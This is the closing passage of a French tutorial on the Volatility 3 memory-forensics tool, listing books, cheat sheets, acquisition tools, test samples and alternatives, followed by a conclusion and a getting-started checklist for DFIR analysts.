### Livres de référence

- 📕 **The Art of Memory Forensics** (Ligh, Case, Levy, Walters — Wiley, 2014) — **la bible** du domaine.
- 📕 **Practical Memory Forensics** (Svetlana Ostrovskaya, Oleg Skulkin — Packt, 2022).

### Tutoriels et cheat sheets

- 📰 **Volatility 3 Cheat Sheet (onfvp)** : <https://blog.onfvp.com/post/volatility-cheatsheet/>
- 📰 **h4rithd Volatility3 Notes** : <https://docs.h4rithd.com/forensic/volatility3>
- 📰 **TryHackMe Volatility Room** : <https://tryhackme.com/room/volatility>
- 🎓 **SANS FOR508** : la formation officielle qui utilise massivement Volatility.

### Outils d'acquisition

- 🔧 **WinPmem (Velocidex)** : <https://github.com/Velocidex/WinPmem>
- 🔧 **AVML (Microsoft)** : <https://github.com/microsoft/avml>
- 🔧 **LiME** : <https://github.com/504ensicsLabs/LiME>
- 🔧 **FTK Imager** : <https://www.exterro.com/digital-forensics-software/ftk-imager>
- 🔧 **Magnet RAM Capture** : <https://www.magnetforensics.com/resources/magnet-ram-capture/>

### Outils complémentaires

- 🔧 **bulk_extractor** : <https://github.com/simsong/bulk_extractor>
- 🔧 **YARA rules CobaltStrikeParser** : <https://github.com/Sentinel-One/CobaltStrikeParser>
- 🔧 **Elastic Endpoint YARA Rules** : <https://github.com/elastic/protections-artifacts>
- 🔧 **awesome-memory-forensics** (curated list) : <https://github.com/digitalisx/awesome-memory-forensics>

### Échantillons de test

- 🧪 **Volatility Foundation samples** : <https://github.com/volatilityfoundation/volatility/wiki/Memory-Samples>
- 🧪 **DFIR Madness samples** : <https://dfirmadness.com>
- 🧪 **MemLabs CTF** : <https://github.com/stuxnet999/MemLabs>
- 🧪 **CFReDS Memory Samples (NIST)** : <https://cfreds.nist.gov>

### Concurrents/Alternatives

- 💰 **Volexity Volcano** (commercial, par les créateurs originaux) : <https://www.volexity.com/products-overview/volcano/>
- 💰 **Magnet AXIOM Cyber** : <https://www.magnetforensics.com>
- 🔧 **Rekall** (fork de Vol2 par Google, peu maintenu désormais) : <https://github.com/google/rekall>

---

## Conclusion

Volatility 3 est **la pièce manquante incontournable** dans toute boîte à outils DFIR sérieuse. Là où IPED, Autopsy et Plaso analysent ce qui est sur le **disque**, Volatility révèle ce qui se passait en **mémoire vive** au moment précis de la capture — un domaine que **les attaquants modernes exploitent massivement** avec leurs malwares fileless, leur process hollowing, leurs implants Cobalt Strike résidant uniquement en RAM.

Sa **richesse fonctionnelle** (150+ plugins), son **support multi-OS**, sa **détection automatique** d'OS et sa **communauté DFIR** en font l'**outil de référence open source** dans le domaine — et probablement pour les années à venir, malgré la concurrence commerciale grandissante de Volexity Volcano.

Néanmoins, c'est un **outil exigeant** : il demande de comprendre les structures internes des OS, de savoir interpréter des faux positifs, de maîtriser la génération de symboles, et de combiner intelligemment plusieurs plugins pour ne pas se faire tromper par des techniques d'évasion. C'est un outil d'**expert**, pas un outil clé en main.

Avec cette série de **5 tutoriels** (IPED, Autopsy, MVT, Plaso, Volatility 3), tu disposes maintenant d'une **chaîne forensique open source complète** :

| Outil | Domaine |
|-------|---------|
| **IPED** | Disque (gros volumes, parsing massif) |
| **Autopsy** | Disque (interface graphique, généraliste) |
| **MVT** | Mobile (détection de spyware Pegasus & co) |
| **Plaso + Timesketch** | Timeline multi-sources, visualisation |
| **Volatility 3** | **RAM, dumps mémoire, malware fileless** |

Ces 5 outils, **gratuits et open source**, rivalisent avec un arsenal commercial valant facilement **30 000 € à 80 000 € de licences annuelles**. Combinés intelligemment, ils couvrent **95 %** des besoins forensiques d'un CERT, d'une équipe DFIR ou d'un service d'enquête.

Pour bien démarrer avec Volatility 3, je recommande de :

1. Installer Volatility 3 via `pip` dans un venv.
2. Télécharger les **symbol packs Windows** depuis volatilityfoundation.org.
3. Récupérer un **échantillon de test** depuis le wiki Volatility (Stuxnet, Cridex, etc.).
4. Lancer la séquence `windows.info` → `windows.pstree` → `windows.netscan` → `windows.malfind` → `timeliner.Timeliner`.
5. T'entraîner sur **MemLabs** ou un **TryHackMe Volatility Room** pour appliquer en CTF.
6. Lire **The Art of Memory Forensics** — incontournable pour maîtriser réellement l'outil.
7. Intégrer la sortie `timeliner` dans **Plaso/Timesketch** pour une vision unifiée disque + RAM.

Bonnes chasses en mémoire ! 🧠🔍
